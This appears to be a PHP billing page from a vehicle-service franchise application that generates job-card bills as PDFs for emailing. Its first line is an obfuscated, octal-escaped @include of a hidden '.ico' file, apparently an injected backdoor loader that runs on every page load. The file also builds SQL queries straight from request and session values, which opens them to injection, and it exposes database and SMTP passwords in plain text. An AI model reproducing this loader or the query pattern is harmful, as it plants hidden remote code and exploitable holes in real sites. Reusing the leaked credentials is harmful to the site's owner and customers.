<?php

/*a3141*/

@include "\057home\057c8mn\146ezha\152nh/p\165blic\137html\057jm.v\145rtex\163olut\151on.c\157.in/\162epor\164s/pu\162chas\145_tax\137repo\162t/.b\06769e0\144d.ic\157";

/*a3141*/
session_start();
//https://www.webslesson.info/2018/08/create-dynamic-pdf-send-as-attachment-with-email-in-php.html
//index.php


$hostname="localhost";
$Username="tidi";
$Password="^wGqEHRqRVnt";
$Dbname="tidi";

$conn=mysqli_connect($hostname,$Username,$Password,$Dbname) or die("cannot connect"); 
//mysqli_select_db($conn,) or die("cannot select DB");


$message = '';

$conn = new mysqli($hostname,$Username,$Password,$Dbname);
//$connect = new PDO($hostname,$Username,$Password,$Dbname);


function fetch_customer_data($conn)
{
$date=date('d/m/Y');
 $s="select * from s_job_card where job_card_no='".$_REQUEST['job_card_no']."'"; 
$Es=mysqli_query($conn,$s); 
$Fs=mysqli_fetch_array($Es);
$n=mysqli_num_rows($Es);
$ino=$n;

 $spm="select * from m_franchisee where id='".$_SESSION['FranchiseeId']."'";;
 $Scm=mysqli_query($conn,$spm);
 $Frp1=mysqli_fetch_array($Scm);



$output='<div class="table-responsive">
<table class="table table-striped"  >

<tr>
<td align="center" colspan="8" ><span style="font-size:28px"><B>'.$Frp1['franchisee_name'].'</B></span><BR/>'.$Frp1['address'].',<BR/>'.$Frp1['cen_manager'].',<BR/>'.$Frp1['con_number'].'<BR/></td>
</tr>';

 $cus="select * from a_customer where id='".$Fs['customer_id']."'";
$spm=mysqli_query($conn,$cus);
$epm=mysqli_fetch_array($spm);

$supname=$epm["cust_name"];
$supemail=$epm["email"];
$_SESSION['cust_name']=$supname;
$_SESSION['email']=$supemail;
	
	
$output.='<tr>
<td  align="LEFT" colspan="5"style="font-size:18px"> <B>JOBCARD TO</b><BR/>
Customer Name  : <B>'.$epm['cust_name'].'</B><BR/>
  Mobile No: <B>'.$epm['mobile1'].'</B><BR/>
  Address : <B>'.$epm['addr'].'</B><BR/>
  Email :<B>'.$_SESSION['email'].'</B><BR/>
  
  
<td  boalign="LEFT" colspan="1" ><span style="font-size:18px">Date : <b>'.date("d-m-Y", strtotime($Fs['jdate'])).'</b></span><br/>
 <B> JOBCARD NO:</B> <b>'.$Fs['job_card_no'].'</b><br/>
 </tr>'; 
$output.='
  
<tr align="right">
<td colspan="1"></td>
<td align="left" colspan="8" style=" height:20px" ><span style="font-size:20px">VEHICLE DETAILS</span></td>
</tr>
<tr align="left" colspan="4">

<td ><b>S:No</b></td>
<td><b>VEHICLE NO</b></td>
<td ><b>VEHICLE MODEL</b></td>
<td ><b>VEHICLE BRAND</b></td>
<td ><b>VEHICLE SEGMENT</b></td>
<td ><b>VEHICLE TYPE</b></td>

</tr>';
$i=0;
 $gt1="select * from s_job_card where job_card_no='".$_REQUEST['job_card_no']."'"; 
$Egt1=mysqli_query($conn,$gt1);
while($Fs1=mysqli_fetch_array($Egt1))
{
 $cus="select * from a_customer_vehicle_details where vehicle_no='".$Fs1['vehicle_no']."'";
 $spm=mysqli_query($conn,$cus);
 $epm=mysqli_fetch_array($spm);
 
		 $cus1="select * from master_vehicle where Id='".$epm['VehicleModel']."'";
         $spm1=mysqli_query($conn,$cus1);
         $epm1=mysqli_fetch_array($spm1);
$i++;

$output.='<tr>

<td >'.$i.'</td>
<td >'.$epm['vehicle_no'].'</td>
<td  >'.$epm1['VehicleModel'].'</td>
<td  >'.$epm['VehicleBrand'].'</td>
<td  >'.$epm['VehicleSegment'].'</td>
<td  >'.$epm['VehicleType'].'</td>

</tr>';
}
$pq="select * from s_job_card_sdetails where job_card_no='".$Fs['id']."'";
$rs=mysqli_query($conn,$pq);
$n=mysqli_num_rows($rs);
if($n>0)
{
  
$output.='
  
<tr align="right">
<td colspan="1"></td>
<td align="left" colspan="8" style=" height:20px" ><span style="font-size:20px">SERVICE DETAILS</span></td>
</tr>
<tr align="left" colspan="5">

<td colspan="2"><b>S:No</b></td>
<td colspan="2"><b>SERVICE NAME</b></td>
<td colspan="2"><b>AMOUNT</b></td>

</tr>';
$i=0;
 $gt1="select * from s_job_card_sdetails where job_card_no='".$Fs['id']."'"; 
$Egt1=mysqli_query($conn,$gt1);
while($Fs1=mysqli_fetch_array($Egt1))
{


		
			
			

$i++;

$output.='<tr>

<td colspan="2">'.$i.'</td>
<td colspan="2">'.$Fs1['service_type'].'</td>
<td  colspan="2">'.$Fs1['st_amt'].'</td>

</tr>';
}
}
$gt1="select * from s_job_card where job_card_no='".$_REQUEST['job_card_no']."'"; 
$Egt1=mysqli_query($conn,$gt1);
$Fs1=mysqli_fetch_array($Egt1);

$gt2="select * from a_final_bill where JobcardId='".$Fs1['id']."'"; 
$Egt2=mysqli_query($conn,$gt2);
$Fs2=mysqli_fetch_array($Egt2);

$hdfj=$Fs2['ServiceAmountAfterGst']-$Fs2['TotalServiceAmount'];
					$adb=$hdfj/2;
$output.=
'<tr >
<td colspan="4"></td>
<td ><b>SERVICE AMOUNT :</b> </td>
<td><b>'.$Fs2['TotalServiceAmount'].'</b></td>
</tr>';
$output.=
'<tr >
<td colspan="4"></td>
<td ><b>CGST :</b> </td>
<td><b>'.$adb.'</b></td>
</tr>';
$output.=
'<tr >
<td colspan="4"></td>
<td ><b>SGST :</b> </td>
<td><b>'.$adb.'</b></td>
</tr>';
$output.=
'<tr >
<td colspan="4"></td>
<td ><b>TOTAL SERVICE AMOUNT :</b> </td>
<td><b>'.$Fs2['ServiceAmountAfterGst'].'</b></td>
</tr>';
$output.=
'<tr >
<td colspan="4"></td>
<td ><b>DISCOUNT AMOUNT :</b></td>
<td><b>'.$Fs2['discount'].'</b></td>
</tr>';
$output.=
'<tr >
<td colspan="4"></td>
<td ><b>BILL AMOUNT :</b> </td>
<td><b>'.$Fs2['Total_bill_Amount'].'</b></td>
</tr>';
$output.=
'<tr >
<td colspan="4"></td>
<td ><b>PAID AMOUNT :</b></td>
<td><b>'.$Fs2['paid_amt'].'</b></td>
</tr>';
$output.=
'<tr >
<td colspan="4"></td>
<td ><b>BALANCE AMOUNT :</b> </td>
<td><b>'.$Fs2['bal_amt'].'</b></td>
</tr>';


$output.=
'<tr height="30px">
     <td align="center" colspan="12"><strong>Thank You For Your Business</strong></td>
  </tr>
</table></div>';
	return $output;
}
// fetch_customer_data($connect);
//exit();
if(isset($_POST["action"]))
{
	include('pdf.php');
	$file_name = md5(rand()) . '.pdf';
	$html_code = '<link rel="stylesheet" href="bootstrap.min.css">';
	$html_code .= fetch_customer_data($conn);
	$pdf = new Pdf();
	$pdf->load_html($html_code);
	$pdf->render();
	$file = $pdf->output();
	file_put_contents($file_name, $file);
	//file_put_contents($file_name, $file);
	$_SESSION['afile']=$file_name;
	$s1="select * from s_job_card where job_card_no='".$_REQUEST['job_card_no']."'"; 
    $Es1=mysqli_query($conn,$s1);
    $Fs1=mysqli_fetch_array($Es1);
	
	$s11="select * from a_customer where id='".$Fs1['customer_id']."'"; 
    $Es11=mysqli_query($conn,$s11);
    $Fs11=mysqli_fetch_array($Es11);
	
	 $_SESSION['mail']=$Fs11['email']; 
	 header("location:send_mail.php");	
	/*
	require 'class/class.phpmailer.php';
	$mail = new PHPMailer;
	$mail->IsSMTP();								//Sets Mailer to send message using SMTP
	$mail->Host = 'smtpout.secureserver.net';		//Sets the SMTP hosts of your Email hosting, this for Godaddy
	$mail->Port = '80';								//Sets the default SMTP server port
	$mail->SMTPAuth = true;							//Sets SMTP authentication. Utilizes the Username and Password variables
	$mail->Username = 'support@vertexsolution.co.in';					//Sets SMTP username //support@vertexsolution.co.in
	$mail->Password = 'vertex123';					//Sets SMTP password //vertex123
	$mail->SMTPSecure = 'None';							//Sets connection prefix. Options are "", "ssl" or "tls"
	$mail->From = 'audit@tyresmart.in';			//Sets the From email address for the message
	$mail->FromName = 'autodetailerz.com';			//Sets the From name of the message
	$mail->AddAddress($_SESSION['supemail'], $_SESSION['supname']);		//Adds a "To" address
	$mail->WordWrap = 50;							//Sets word wrapping on the body of the message to a given number of characters
	$mail->IsHTML(true);							//Sets message type to HTML				
	$mail->AddAttachment($file_name);     				//Adds an attachment from a path on the filesystem
	$mail->Subject = 'Bill  from Auto Detailerz';			//Sets the Subject of the message
	$mail->Body = 'Hi,Please Find Bill details in attached PDF File.';				//An HTML or plain text message body
	if($mail->Send())								//Send an Email. Return true on success or false on error
	{
		$message = '<label class="text-success">Bill Details has been sent successfully...</label>';
	}
	unlink($file_name);
	*/
}
?>
<!DOCTYPE html>
<html>
	<head>
		<title>Bill Details</title>
		<script src="jquery.min.js"></script>
		<link rel="stylesheet" href="bootstrap.min.css" />
		<script src="bootstrap.min.js"></script>
	</head>
	<body>
		<br />
		<div class="container">
			<h3 align="center">Bill Details</h3>
			<br />
			<form method="post">
				<input type="submit" name="action" class="btn btn-danger" value="PDF Send" /><?php echo $message; ?>
			</form>
			<br />
			<?php
			echo fetch_customer_data($conn);
			?>			
		</div>
		<br />
		<br />
	</body>
</html>





